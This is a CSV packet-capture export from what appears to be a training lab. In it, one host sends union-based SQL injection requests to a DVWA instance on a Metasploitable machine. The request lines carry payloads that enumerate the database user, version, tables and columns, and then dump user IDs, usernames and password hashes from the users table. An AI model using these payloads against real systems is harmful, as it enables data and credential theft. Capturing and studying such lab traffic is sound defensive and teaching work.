"181","239.596385369","10.0.2.4","10.0.2.5","TCP","2962","80  >  40524 [ACK] Seq=1 Ack=530 Win=6912 Len=2896 TSval=49851 TSecr=3495507900 [TCP segment of a reassembled PDU]"
"182","239.596395486","10.0.2.5","10.0.2.4","TCP","66","40524  >  80 [ACK] Seq=530 Ack=2897 Win=31872 Len=0 TSval=3495507908 TSecr=49851"
"183","239.596542351","10.0.2.4","10.0.2.5","TCP","1514","80  >  40524 [ACK] Seq=2897 Ack=530 Win=6912 Len=1448 TSval=49852 TSecr=3495507900 [TCP segment of a reassembled PDU]"
"184","239.596545249","10.0.2.5","10.0.2.4","TCP","66","40524  >  80 [ACK] Seq=530 Ack=4345 Win=31872 Len=0 TSval=3495507908 TSecr=49852"
"185","239.596901916","10.0.2.4","10.0.2.5","HTTP","570","HTTP/1.1 200 OK  (text/html)"
"186","239.596904377","10.0.2.5","10.0.2.4","TCP","66","40524  >  80 [ACK] Seq=530 Ack=4849 Win=31872 Len=0 TSval=3495507909 TSecr=49852"
"187","239.597852621","10.0.2.5","10.0.2.4","TCP","66","40524  >  80 [FIN, ACK] Seq=530 Ack=4849 Win=31872 Len=0 TSval=3495507910 TSecr=49852"
"188","239.598464947","10.0.2.4","10.0.2.5","TCP","66","80  >  40524 [FIN, ACK] Seq=4849 Ack=531 Win=6912 Len=0 TSval=49852 TSecr=3495507910"
"189","239.598471638","10.0.2.5","10.0.2.4","TCP","66","40524  >  80 [ACK] Seq=531 Ack=4850 Win=31872 Len=0 TSval=3495507910 TSecr=49852"
"190","250.464982515","10.0.2.5","10.0.2.4","TCP","74","39818  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495518777 TSecr=0 WS=128"
"191","250.465528342","10.0.2.4","10.0.2.5","TCP","74","80  >  39818 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=50938 TSecr=3495518777 WS=128"
"192","250.465541783","10.0.2.5","10.0.2.4","TCP","66","39818  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495518777 TSecr=50938"
"193","250.468183784","10.0.2.5","10.0.2.4","HTTP","592","GET /dvwa/vulnerabilities/sqli/?id=2'+union+select+@@user,2--+&Submit=Submit HTTP/1.1 "
"194","250.468746577","10.0.2.4","10.0.2.5","TCP","66","80  >  39818 [ACK] Seq=1 Ack=527 Win=6912 Len=0 TSval=50939 TSecr=3495518780"
"195","250.476401546","10.0.2.4","10.0.2.5","HTTP","476","HTTP/1.1 200 OK  (text/html)"
"196","250.476420439","10.0.2.5","10.0.2.4","TCP","66","39818  >  80 [ACK] Seq=527 Ack=411 Win=31872 Len=0 TSval=3495518788 TSecr=50939"
"197","251.479561881","10.0.2.5","10.0.2.4","TCP","66","39818  >  80 [FIN, ACK] Seq=527 Ack=411 Win=31872 Len=0 TSval=3495519791 TSecr=50939"
"198","251.480175408","10.0.2.4","10.0.2.5","TCP","66","80  >  39818 [FIN, ACK] Seq=411 Ack=528 Win=6912 Len=0 TSval=51040 TSecr=3495519791"
"199","251.480479712","10.0.2.5","10.0.2.4","TCP","66","39818  >  80 [ACK] Seq=528 Ack=412 Win=31872 Len=0 TSval=3495519792 TSecr=51040"
"200","260.721487427","10.0.2.5","10.0.2.4","TCP","74","59766  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495529033 TSecr=0 WS=128"
"201","260.722015594","10.0.2.4","10.0.2.5","TCP","74","80  >  59766 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=51964 TSecr=3495529033 WS=128"
"202","260.722046924","10.0.2.5","10.0.2.4","TCP","66","59766  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495529034 TSecr=51964"
"203","260.724603754","10.0.2.5","10.0.2.4","HTTP","594","GET /dvwa/vulnerabilities/sqli/?id=2'+union+select+dbname(),2--+&Submit=Submit HTTP/1.1 "
"204","260.725474727","10.0.2.4","10.0.2.5","TCP","66","80  >  59766 [ACK] Seq=1 Ack=529 Win=6912 Len=0 TSval=51964 TSecr=3495529036"
"205","260.732384134","10.0.2.4","10.0.2.5","HTTP","481","HTTP/1.1 200 OK  (text/html)"
"206","260.732412794","10.0.2.5","10.0.2.4","TCP","66","59766  >  80 [ACK] Seq=529 Ack=416 Win=31872 Len=0 TSval=3495529044 TSecr=51964"
"207","261.735458120","10.0.2.5","10.0.2.4","TCP","66","59766  >  80 [FIN, ACK] Seq=529 Ack=416 Win=31872 Len=0 TSval=3495530047 TSecr=51964"
"208","261.736928076","10.0.2.4","10.0.2.5","TCP","66","80  >  59766 [FIN, ACK] Seq=416 Ack=530 Win=6912 Len=0 TSval=52065 TSecr=3495530047"
"209","261.736962433","10.0.2.5","10.0.2.4","TCP","66","59766  >  80 [ACK] Seq=530 Ack=417 Win=31872 Len=0 TSval=3495530049 TSecr=52065"
"210","347.770855128","10.0.2.4","10.0.2.255","BROWSER","286","Local Master Announcement METASPLOITABLE, Workstation, Server, Print Queue Server, Xenix Server, NT Workstation, NT Server, Master Browser"
"211","347.770855387","10.0.2.4","10.0.2.255","BROWSER","257","Domain/Workgroup Announcement WORKGROUP, NT Workstation, Domain Enum"
"212","361.893293434","10.0.2.5","172.31.1.130","DNS","84","Standard query 0xd016 A perfdata.portswigger.net"
"213","361.893563455","10.0.2.5","172.31.1.130","DNS","84","Standard query 0x5114 AAAA perfdata.portswigger.net"
"214","361.910748627","172.31.1.130","10.0.2.5","DNS","429","Standard query response 0xd016 A perfdata.portswigger.net A 34.241.103.101 A 52.212.154.154 NS ns-1337.awsdns-39.org NS ns-194.awsdns-24.com NS ns-573.awsdns-07.net NS ns-1955.awsdns-52.co.uk A 205.251.197.57 A 205.251.192.194 A 205.251.199.163 A 205.251.194.61 AAAA 2600:9000:5305:3900::1 AAAA 2600:9000:5300:c200::1 AAAA 2600:9000:5307:a300::1 AAAA 2600:9000:5302:3d00::1"
"215","361.910748681","172.31.1.130","10.0.2.5","DNS","165","Standard query response 0x5114 AAAA perfdata.portswigger.net SOA ns-573.awsdns-07.net"
"216","361.911508366","10.0.2.5","34.241.103.101","TCP","74","33092  >  443 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3429561796 TSecr=0 WS=128"
"217","361.983300619","10.0.2.5","10.0.2.3","DHCP","324","DHCP Request  - Transaction ID 0x8e4a6e80"
"218","361.985703639","10.0.2.3","10.0.2.5","DHCP","590","DHCP ACK      - Transaction ID 0x8e4a6e80"
"219","362.072508321","34.241.103.101","10.0.2.5","TCP","60","443  >  33092 [SYN, ACK] Seq=0 Ack=1 Win=32768 Len=0 MSS=1460"
"220","362.072548820","10.0.2.5","34.241.103.101","TCP","54","33092  >  443 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"221","362.081791244","10.0.2.5","34.241.103.101","TLSv1.2","559","Client Hello"
"222","362.243690375","34.241.103.101","10.0.2.5","TLSv1.2","2974","Server Hello"
"223","362.243728054","10.0.2.5","34.241.103.101","TCP","54","33092  >  443 [ACK] Seq=506 Ack=2921 Win=30660 Len=0"
"224","362.244137880","34.241.103.101","10.0.2.5","TCP","1514","443  >  33092 [PSH, ACK] Seq=2921 Ack=506 Win=32263 Len=1460 [TCP segment of a reassembled PDU]"
"225","362.244147427","10.0.2.5","34.241.103.101","TCP","54","33092  >  443 [ACK] Seq=506 Ack=4381 Win=30660 Len=0"
"226","362.244835214","34.241.103.101","10.0.2.5","TLSv1.2","1080","Certificate, Server Key Exchange, Server Hello Done"
"227","362.244854438","10.0.2.5","34.241.103.101","TCP","54","33092  >  443 [ACK] Seq=506 Ack=5407 Win=30660 Len=0"
"228","362.253344700","10.0.2.5","34.241.103.101","TLSv1.2","129","Client Key Exchange"
"229","362.315032459","34.241.103.101","10.0.2.5","TCP","60","443  >  33092 [ACK] Seq=5407 Ack=581 Win=32188 Len=0"
"230","362.315071047","10.0.2.5","34.241.103.101","TLSv1.2","105","Change Cipher Spec, Encrypted Handshake Message"
"231","362.475957287","34.241.103.101","10.0.2.5","TLSv1.2","258","New Session Ticket, Change Cipher Spec, Encrypted Handshake Message"
"232","362.476966538","10.0.2.5","34.241.103.101","TLSv1.2","985","Application Data"
"233","362.565722239","34.241.103.101","10.0.2.5","TCP","60","443  >  33092 [ACK] Seq=5611 Ack=1563 Win=32768 Len=0"
"234","362.669600181","34.241.103.101","10.0.2.5","TLSv1.2","237","Application Data"
"235","362.669600503","34.241.103.101","10.0.2.5","TCP","60","443  >  33092 [FIN, ACK] Seq=5794 Ack=1563 Win=32768 Len=0"
"236","362.671560563","10.0.2.5","34.241.103.101","TLSv1.2","85","Encrypted Alert"
"237","362.672052413","10.0.2.5","34.241.103.101","TCP","54","33092  >  443 [FIN, ACK] Seq=1594 Ack=5795 Win=30660 Len=0"
"238","362.672706991","34.241.103.101","10.0.2.5","TCP","60","443  >  33092 [ACK] Seq=5795 Ack=1595 Win=32736 Len=0"
"239","367.155508655","PcsCompu_c9:93:64","PcsCompu_cc:77:b6","ARP","42","Who has 10.0.2.3? Tell 10.0.2.5"
"240","367.155847236","PcsCompu_cc:77:b6","PcsCompu_c9:93:64","ARP","60","10.0.2.3 is at 08:00:27:cc:77:b6"
"241","401.275127279","10.0.2.5","10.0.2.4","TCP","74","36916  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495669587 TSecr=0 WS=128"
"242","401.283160103","PcsCompu_a3:ab:42","Broadcast","ARP","60","Who has 10.0.2.5? Tell 10.0.2.4"
"243","401.283169627","PcsCompu_c9:93:64","PcsCompu_a3:ab:42","ARP","42","10.0.2.5 is at 08:00:27:c9:93:64"
"244","401.283607292","10.0.2.4","10.0.2.5","TCP","74","80  >  36916 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=66016 TSecr=3495669587 WS=128"
"245","401.283638580","10.0.2.5","10.0.2.4","TCP","66","36916  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495669595 TSecr=66016"
"246","401.284092101","10.0.2.5","10.0.2.4","HTTP","671","GET /dvwa/vulnerabilities/sqli/?id=2'+union+select+group_concat(table_name),2+from+information_schema.tables+where+table_schema=database()--+&Submit=Submit HTTP/1.1 "
"247","401.284552965","10.0.2.4","10.0.2.5","TCP","66","80  >  36916 [ACK] Seq=1 Ack=606 Win=7040 Len=0 TSval=66017 TSecr=3495669596"
"248","401.297275640","10.0.2.4","10.0.2.5","TCP","2962","80  >  36916 [ACK] Seq=1 Ack=606 Win=7040 Len=2896 TSval=66018 TSecr=3495669596 [TCP segment of a reassembled PDU]"
"249","401.297311319","10.0.2.5","10.0.2.4","TCP","66","36916  >  80 [ACK] Seq=606 Ack=2897 Win=31872 Len=0 TSval=3495669609 TSecr=66018"
"250","401.297814752","10.0.2.4","10.0.2.5","HTTP","2178","HTTP/1.1 200 OK  (text/html)"
"251","401.297836122","10.0.2.5","10.0.2.4","TCP","66","36916  >  80 [ACK] Seq=606 Ack=5009 Win=31872 Len=0 TSval=3495669610 TSecr=66018"
"252","401.298309619","10.0.2.5","10.0.2.4","TCP","66","36916  >  80 [FIN, ACK] Seq=606 Ack=5009 Win=31872 Len=0 TSval=3495669610 TSecr=66018"
"253","401.298886497","10.0.2.4","10.0.2.5","TCP","66","80  >  36916 [FIN, ACK] Seq=5009 Ack=607 Win=7040 Len=0 TSval=66018 TSecr=3495669610"
"254","401.298891504","10.0.2.5","10.0.2.4","TCP","66","36916  >  80 [ACK] Seq=607 Ack=5010 Win=31872 Len=0 TSval=3495669611 TSecr=66018"
"255","406.324161029","PcsCompu_c9:93:64","PcsCompu_a3:ab:42","ARP","42","Who has 10.0.2.4? Tell 10.0.2.5"
"256","406.324675682","PcsCompu_a3:ab:42","PcsCompu_c9:93:64","ARP","60","10.0.2.4 is at 08:00:27:a3:ab:42"
"257","418.165253331","34.107.243.93","10.0.2.5","TLSv1.2","78","Application Data"
"258","418.165517959","10.0.2.5","34.107.243.93","TLSv1.2","82","Application Data"
"259","418.244882252","34.107.243.93","10.0.2.5","TCP","60","443  >  57910 [ACK] Seq=49 Ack=57 Win=32578 Len=0"
"260","423.219450797","PcsCompu_c9:93:64","RealtekU_12:35:00","ARP","42","Who has 10.0.2.1? Tell 10.0.2.5"
"261","423.220023463","RealtekU_12:35:00","PcsCompu_c9:93:64","ARP","60","10.0.2.1 is at 52:54:00:12:35:00"
"262","460.143762242","10.0.2.5","10.0.2.4","TCP","74","47130  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495728456 TSecr=0 WS=128"
"263","460.144331281","10.0.2.4","10.0.2.5","TCP","74","80  >  47130 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=71901 TSecr=3495728456 WS=128"
"264","460.144369432","10.0.2.5","10.0.2.4","TCP","66","47130  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495728456 TSecr=71901"
"265","460.144542238","10.0.2.5","10.0.2.4","HTTP","595","GET /dvwa/vulnerabilities/sqli/?id=2'+union+select+version(),2--+&Submit=Submit HTTP/1.1 "
"266","460.144916214","10.0.2.4","10.0.2.5","TCP","66","80  >  47130 [ACK] Seq=1 Ack=530 Win=6912 Len=0 TSval=71901 TSecr=3495728456"
"267","460.155285115","10.0.2.4","10.0.2.5","TCP","4410","80  >  47130 [ACK] Seq=1 Ack=530 Win=6912 Len=4344 TSval=71902 TSecr=3495728456 [TCP segment of a reassembled PDU]"
"268","460.155311755","10.0.2.5","10.0.2.4","TCP","66","47130  >  80 [ACK] Seq=530 Ack=4345 Win=31872 Len=0 TSval=3495728467 TSecr=71902"
"269","460.155842920","10.0.2.4","10.0.2.5","HTTP","579","HTTP/1.1 200 OK  (text/html)"
"270","460.155862119","10.0.2.5","10.0.2.4","TCP","66","47130  >  80 [ACK] Seq=530 Ack=4858 Win=31872 Len=0 TSval=3495728468 TSecr=71902"
"271","460.156323002","10.0.2.5","10.0.2.4","TCP","66","47130  >  80 [FIN, ACK] Seq=530 Ack=4858 Win=31872 Len=0 TSval=3495728468 TSecr=71902"
"272","460.156928623","10.0.2.4","10.0.2.5","TCP","66","80  >  47130 [FIN, ACK] Seq=4858 Ack=531 Win=6912 Len=0 TSval=71903 TSecr=3495728468"
"273","460.156935133","10.0.2.5","10.0.2.4","TCP","66","47130  >  80 [ACK] Seq=531 Ack=4859 Win=31872 Len=0 TSval=3495728469 TSecr=71903"
"274","465.202976466","PcsCompu_c9:93:64","PcsCompu_a3:ab:42","ARP","42","Who has 10.0.2.4? Tell 10.0.2.5"
"275","465.204113381","PcsCompu_a3:ab:42","PcsCompu_c9:93:64","ARP","60","10.0.2.4 is at 08:00:27:a3:ab:42"
"276","472.463113573","10.0.2.5","10.0.2.4","TCP","74","41528  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495740775 TSecr=0 WS=128"
"277","472.463763759","10.0.2.4","10.0.2.5","TCP","74","80  >  41528 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=73133 TSecr=3495740775 WS=128"
"278","472.463795945","10.0.2.5","10.0.2.4","TCP","66","41528  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495740776 TSecr=73133"
"279","472.466473436","10.0.2.5","10.0.2.4","HTTP","596","GET /dvwa/vulnerabilities/sqli/?id=2'+union+select+database(),2--+&Submit=Submit HTTP/1.1 "
"280","472.467096471","10.0.2.4","10.0.2.5","TCP","66","80  >  41528 [ACK] Seq=1 Ack=531 Win=6912 Len=0 TSval=73133 TSecr=3495740778"
"281","472.476241714","10.0.2.4","10.0.2.5","TCP","4410","80  >  41528 [ACK] Seq=1 Ack=531 Win=6912 Len=4344 TSval=73134 TSecr=3495740778 [TCP segment of a reassembled PDU]"
"282","472.476279419","10.0.2.5","10.0.2.4","TCP","66","41528  >  80 [ACK] Seq=531 Ack=4345 Win=31872 Len=0 TSval=3495740788 TSecr=73134"
"283","472.477053895","10.0.2.4","10.0.2.5","HTTP","569","HTTP/1.1 200 OK  (text/html)"
"284","472.477060506","10.0.2.5","10.0.2.4","TCP","66","41528  >  80 [ACK] Seq=531 Ack=4848 Win=31872 Len=0 TSval=3495740789 TSecr=73134"
"285","472.481942053","10.0.2.5","10.0.2.4","TCP","66","41528  >  80 [FIN, ACK] Seq=531 Ack=4848 Win=31872 Len=0 TSval=3495740794 TSecr=73134"
"286","472.482759188","10.0.2.4","10.0.2.5","TCP","66","80  >  41528 [FIN, ACK] Seq=4848 Ack=532 Win=6912 Len=0 TSval=73135 TSecr=3495740794"
"287","472.482768574","10.0.2.5","10.0.2.4","TCP","66","41528  >  80 [ACK] Seq=532 Ack=4849 Win=31872 Len=0 TSval=3495740795 TSecr=73135"
"288","478.815893139","10.0.2.5","10.0.2.4","TCP","74","38550  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495747128 TSecr=0 WS=128"
"289","478.816516199","10.0.2.4","10.0.2.5","TCP","74","80  >  38550 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=73768 TSecr=3495747128 WS=128"
"290","478.816528490","10.0.2.5","10.0.2.4","TCP","66","38550  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495747128 TSecr=73768"
"291","478.818192188","10.0.2.5","10.0.2.4","HTTP","592","GET /dvwa/vulnerabilities/sqli/?id=2'+union+select+user(),2--+&Submit=Submit HTTP/1.1 "
"292","478.818451161","10.0.2.4","10.0.2.5","TCP","66","80  >  38550 [ACK] Seq=1 Ack=527 Win=6912 Len=0 TSval=73768 TSecr=3495747130"
"293","478.827835532","10.0.2.4","10.0.2.5","TCP","4410","80  >  38550 [ACK] Seq=1 Ack=527 Win=6912 Len=4344 TSval=73769 TSecr=3495747130 [TCP segment of a reassembled PDU]"
"294","478.827870075","10.0.2.5","10.0.2.4","TCP","66","38550  >  80 [ACK] Seq=527 Ack=4345 Win=31872 Len=0 TSval=3495747140 TSecr=73769"
"295","478.828217529","10.0.2.4","10.0.2.5","HTTP","571","HTTP/1.1 200 OK  (text/html)"
"296","478.828220875","10.0.2.5","10.0.2.4","TCP","66","38550  >  80 [ACK] Seq=527 Ack=4850 Win=31872 Len=0 TSval=3495747140 TSecr=73769"
"297","478.831129446","10.0.2.5","10.0.2.4","TCP","66","38550  >  80 [FIN, ACK] Seq=527 Ack=4850 Win=31872 Len=0 TSval=3495747143 TSecr=73769"
"298","478.831685445","10.0.2.4","10.0.2.5","TCP","66","80  >  38550 [FIN, ACK] Seq=4850 Ack=528 Win=6912 Len=0 TSval=73770 TSecr=3495747143"
"299","478.831696899","10.0.2.5","10.0.2.4","TCP","66","38550  >  80 [ACK] Seq=528 Ack=4851 Win=31872 Len=0 TSval=3495747144 TSecr=73770"
"300","505.758128411","fe80::ce8b:2371:92ee:4afb","ff02::2","ICMPv6","62","Router Solicitation"
"301","520.391913151","PcsCompu_a3:ab:42","Broadcast","ARP","60","Who has 10.0.2.3? Tell 10.0.2.4"
"302","524.113384030","10.0.2.5","10.0.2.4","TCP","74","47860  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495792425 TSecr=0 WS=128"
"303","524.113958606","10.0.2.4","10.0.2.5","TCP","74","80  >  47860 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=78297 TSecr=3495792425 WS=128"
"304","524.113970376","10.0.2.5","10.0.2.4","TCP","66","47860  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495792426 TSecr=78297"
"305","524.114816847","10.0.2.5","10.0.2.4","HTTP","668","GET /dvwa/vulnerabilities/sqli/?id=2'+union+select+group_concat(column_name),2+from+information_schema.columns+where+table_name='users'--+&Submit=Submit HTTP/1.1 "
"306","524.115377474","10.0.2.4","10.0.2.5","TCP","66","80  >  47860 [ACK] Seq=1 Ack=603 Win=7040 Len=0 TSval=78297 TSecr=3495792427"
"307","524.125319274","10.0.2.4","10.0.2.5","TCP","4410","80  >  47860 [ACK] Seq=1 Ack=603 Win=7040 Len=4344 TSval=78298 TSecr=3495792427 [TCP segment of a reassembled PDU]"
"308","524.125337180","10.0.2.5","10.0.2.4","TCP","66","47860  >  80 [ACK] Seq=603 Ack=4345 Win=31872 Len=0 TSval=3495792437 TSecr=78298"
"309","524.125831433","10.0.2.4","10.0.2.5","HTTP","758","HTTP/1.1 200 OK  (text/html)"
"310","524.125837624","10.0.2.5","10.0.2.4","TCP","66","47860  >  80 [ACK] Seq=603 Ack=5037 Win=31872 Len=0 TSval=3495792438 TSecr=78298"
"311","524.128177852","10.0.2.5","10.0.2.4","TCP","66","47860  >  80 [FIN, ACK] Seq=603 Ack=5037 Win=31872 Len=0 TSval=3495792440 TSecr=78298"
"312","524.128835752","10.0.2.4","10.0.2.5","TCP","66","80  >  47860 [FIN, ACK] Seq=5037 Ack=604 Win=7040 Len=0 TSval=78298 TSecr=3495792440"
"313","524.128856256","10.0.2.5","10.0.2.4","TCP","66","47860  >  80 [ACK] Seq=604 Ack=5038 Win=31872 Len=0 TSval=3495792441 TSecr=78298"
"314","529.202725399","PcsCompu_c9:93:64","PcsCompu_a3:ab:42","ARP","42","Who has 10.0.2.4? Tell 10.0.2.5"
"315","529.203181128","PcsCompu_a3:ab:42","PcsCompu_c9:93:64","ARP","60","10.0.2.4 is at 08:00:27:a3:ab:42"
"316","568.279280516","10.0.2.5","10.0.2.4","TCP","74","35164  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495836591 TSecr=0 WS=128"
"317","568.279969664","10.0.2.4","10.0.2.5","TCP","74","80  >  35164 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=82712 TSecr=3495836591 WS=128"
"318","568.279983453","10.0.2.5","10.0.2.4","TCP","66","35164  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495836592 TSecr=82712"
"319","568.280298210","10.0.2.5","10.0.2.4","HTTP","627","GET /dvwa/vulnerabilities/sqli/?id=2'+union+select+group_concat(user_id,password),2+from+users--+&Submit=Submit HTTP/1.1 "
"320","568.280712362","10.0.2.4","10.0.2.5","TCP","66","80  >  35164 [ACK] Seq=1 Ack=562 Win=7040 Len=0 TSval=82712 TSecr=3495836592"
"321","568.288486759","10.0.2.4","10.0.2.5","TCP","4410","80  >  35164 [ACK] Seq=1 Ack=562 Win=7040 Len=4344 TSval=82713 TSecr=3495836592 [TCP segment of a reassembled PDU]"
"322","568.288496301","10.0.2.5","10.0.2.4","TCP","66","35164  >  80 [ACK] Seq=562 Ack=4345 Win=31872 Len=0 TSval=3495836600 TSecr=82713"
"323","568.288953091","10.0.2.4","10.0.2.5","HTTP","796","HTTP/1.1 200 OK  (text/html)"
"324","568.288957930","10.0.2.5","10.0.2.4","TCP","66","35164  >  80 [ACK] Seq=562 Ack=5075 Win=31872 Len=0 TSval=3495836601 TSecr=82713"
"325","568.291339996","10.0.2.5","10.0.2.4","TCP","66","35164  >  80 [FIN, ACK] Seq=562 Ack=5075 Win=31872 Len=0 TSval=3495836603 TSecr=82713"
"326","568.292245812","10.0.2.4","10.0.2.5","TCP","66","80  >  35164 [FIN, ACK] Seq=5075 Ack=563 Win=7040 Len=0 TSval=82713 TSecr=3495836603"
"327","568.292256480","10.0.2.5","10.0.2.4","TCP","66","35164  >  80 [ACK] Seq=563 Ack=5076 Win=31872 Len=0 TSval=3495836604 TSecr=82713"
"328","573.490716908","PcsCompu_c9:93:64","PcsCompu_a3:ab:42","ARP","42","Who has 10.0.2.4? Tell 10.0.2.5"
"329","573.490974495","PcsCompu_a3:ab:42","PcsCompu_c9:93:64","ARP","60","10.0.2.4 is at 08:00:27:a3:ab:42"
"330","603.475808879","10.0.2.5","10.0.2.4","TCP","74","43730  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495871788 TSecr=0 WS=128"
"331","603.476200877","10.0.2.4","10.0.2.5","TCP","74","80  >  43730 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=86231 TSecr=3495871788 WS=128"
"332","603.476211264","10.0.2.5","10.0.2.4","TCP","66","43730  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495871788 TSecr=86231"
"333","603.477975239","10.0.2.5","10.0.2.4","HTTP","632","GET /dvwa/vulnerabilities/sqli/?id=2'+union+select+group_concat(user_id,0x3a,password),2+from+users--+&Submit=Submit HTTP/1.1 "
"334","603.478511446","10.0.2.4","10.0.2.5","TCP","66","80  >  43730 [ACK] Seq=1 Ack=567 Win=7040 Len=0 TSval=86231 TSecr=3495871790"
"335","603.485819117","10.0.2.4","10.0.2.5","TCP","2962","80  >  43730 [ACK] Seq=1 Ack=567 Win=7040 Len=2896 TSval=86231 TSecr=3495871790 [TCP segment of a reassembled PDU]"
"336","603.485829717","10.0.2.5","10.0.2.4","TCP","66","43730  >  80 [ACK] Seq=567 Ack=2897 Win=31872 Len=0 TSval=3495871798 TSecr=86231"
"337","603.485976093","10.0.2.4","10.0.2.5","TCP","1514","80  >  43730 [ACK] Seq=2897 Ack=567 Win=7040 Len=1448 TSval=86232 TSecr=3495871790 [TCP segment of a reassembled PDU]"
"338","603.485978791","10.0.2.5","10.0.2.4","TCP","66","43730  >  80 [ACK] Seq=567 Ack=4345 Win=31872 Len=0 TSval=3495871798 TSecr=86232"
"339","603.486282345","10.0.2.4","10.0.2.5","HTTP","811","HTTP/1.1 200 OK  (text/html)"
"340","603.486284272","10.0.2.5","10.0.2.4","TCP","66","43730  >  80 [ACK] Seq=567 Ack=5090 Win=31872 Len=0 TSval=3495871798 TSecr=86232"
"341","603.487529196","10.0.2.5","10.0.2.4","TCP","66","43730  >  80 [FIN, ACK] Seq=567 Ack=5090 Win=31872 Len=0 TSval=3495871799 TSecr=86232"
"342","603.487965774","10.0.2.4","10.0.2.5","TCP","66","80  >  43730 [FIN, ACK] Seq=5090 Ack=568 Win=7040 Len=0 TSval=86232 TSecr=3495871799"
"343","603.487973766","10.0.2.5","10.0.2.4","TCP","66","43730  >  80 [ACK] Seq=568 Ack=5091 Win=31872 Len=0 TSval=3495871800 TSecr=86232"
"344","661.983615402","10.0.2.5","10.0.2.3","DHCP","324","DHCP Request  - Transaction ID 0xa1818954"
"345","661.991021386","10.0.2.3","10.0.2.5","DHCP","590","DHCP ACK      - Transaction ID 0xa1818954"
"346","667.188584345","PcsCompu_c9:93:64","PcsCompu_cc:77:b6","ARP","42","Who has 10.0.2.3? Tell 10.0.2.5"
"347","667.189019244","PcsCompu_cc:77:b6","PcsCompu_c9:93:64","ARP","60","10.0.2.3 is at 08:00:27:cc:77:b6"
"348","678.167935832","10.0.2.5","10.0.2.4","TCP","74","36394  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495946480 TSecr=0 WS=128"
"349","678.168433192","10.0.2.4","10.0.2.5","TCP","74","80  >  36394 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=93698 TSecr=3495946480 WS=128"
"350","678.168444935","10.0.2.5","10.0.2.4","TCP","66","36394  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495946480 TSecr=93698"
"351","678.169246995","10.0.2.5","10.0.2.4","HTTP","642","GET /dvwa/vulnerabilities/sqli/?id=2'+union+select+group_concat(user_id,0x3a,user,0x3a,password),2+from+users--+&Submit=Submit HTTP/1.1 "
"352","678.169825988","10.0.2.4","10.0.2.5","TCP","66","80  >  36394 [ACK] Seq=1 Ack=577 Win=7040 Len=0 TSval=93699 TSecr=3495946481"
"353","678.178118787","10.0.2.4","10.0.2.5","TCP","2962","80  >  36394 [ACK] Seq=1 Ack=577 Win=7040 Len=2896 TSval=93699 TSecr=3495946481 [TCP segment of a reassembled PDU]"
"354","678.178126944","10.0.2.5","10.0.2.4","TCP","66","36394  >  80 [ACK] Seq=577 Ack=2897 Win=31872 Len=0 TSval=3495946490 TSecr=93699"
"355","678.178266870","10.0.2.4","10.0.2.5","TCP","1514","80  >  36394 [ACK] Seq=2897 Ack=577 Win=7040 Len=1448 TSval=93699 TSecr=3495946481 [TCP segment of a reassembled PDU]"
"356","678.178269394","10.0.2.5","10.0.2.4","TCP","66","36394  >  80 [ACK] Seq=577 Ack=4345 Win=31872 Len=0 TSval=3495946490 TSecr=93699"
"357","678.178513626","10.0.2.4","10.0.2.5","HTTP","863","HTTP/1.1 200 OK  (text/html)"
"358","678.178515361","10.0.2.5","10.0.2.4","TCP","66","36394  >  80 [ACK] Seq=577 Ack=5142 Win=31872 Len=0 TSval=3495946490 TSecr=93699"
"359","678.179499776","10.0.2.5","10.0.2.4","TCP","66","36394  >  80 [FIN, ACK] Seq=577 Ack=5142 Win=31872 Len=0 TSval=3495946491 TSecr=93699"
"360","678.180232413","10.0.2.4","10.0.2.5","TCP","66","80  >  36394 [FIN, ACK] Seq=5142 Ack=578 Win=7040 Len=0 TSval=93700 TSecr=3495946491"
"361","678.180238976","10.0.2.5","10.0.2.4","TCP","66","36394  >  80 [ACK] Seq=578 Ack=5143 Win=31872 Len=0 TSval=3495946492 TSecr=93700"
